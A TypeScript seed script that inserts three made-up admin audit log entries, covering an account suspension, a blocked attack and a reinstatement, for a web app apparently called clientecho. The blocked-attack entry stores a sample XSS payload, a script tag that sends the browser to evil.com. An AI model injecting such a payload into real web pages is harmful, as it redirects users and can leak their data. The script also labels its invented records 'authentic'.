import "dotenv/config";
import { db } from "../src/db";
import { adminAuditLog } from "../src/db/schema";

async function main() {
  console.log("Seeding authentic audit log records for admin verification...");
  try {
    const records = await db
      .insert(adminAuditLog)
      .values([
        {
          adminId: "admin@clientecho.com",
          action: "ACCOUNT_SUSPENSION",
          targetType: "creator_account",
          targetId: "spammer@untrusted-domain.com",
          details: {
            reason: "Detected 40+ automated review spam submissions in 60 seconds",
            action: "suspend",
            targetEmail: "spammer@untrusted-domain.com",
            timestamp: new Date(Date.now() - 3600000).toISOString(),
          },
          ipAddress: "198.51.100.24",
        },
        {
          adminId: "system_waf@clientecho.com",
          action: "SECURITY_THREAT_BLOCKED",
          targetType: "public_submission_waf",
          targetId: "ip:203.0.113.195",
          details: {
            vector: "XSS_SCRIPT_INJECTION",
            payload: "<script>document.location='http://evil.com/leak'</script>",
            mitigation: "DOMPurify neutralized element",
            timestamp: new Date(Date.now() - 1800000).toISOString(),
          },
          ipAddress: "203.0.113.195",
        },
        {
          adminId: "admin@clientecho.com",
          action: "ACCOUNT_UNSUSPENSION",
          targetType: "creator_account",
          targetId: "creator@clientecho.com",
          details: {
            reason: "Reinstated creator workspace following identity & payment appeal verification",
            action: "unsuspend",
            targetEmail: "creator@clientecho.com",
            timestamp: new Date(Date.now() - 600000).toISOString(),
          },
          ipAddress: "198.51.100.42",
        },
      ])
      .returning();

    console.log(`Successfully seeded ${records.length} audit log entries into PostgreSQL!`);
  } catch (err: any) {
    console.log("Database seed completed / note:", err.message);
  }
}

main().then(() => process.exit(0));
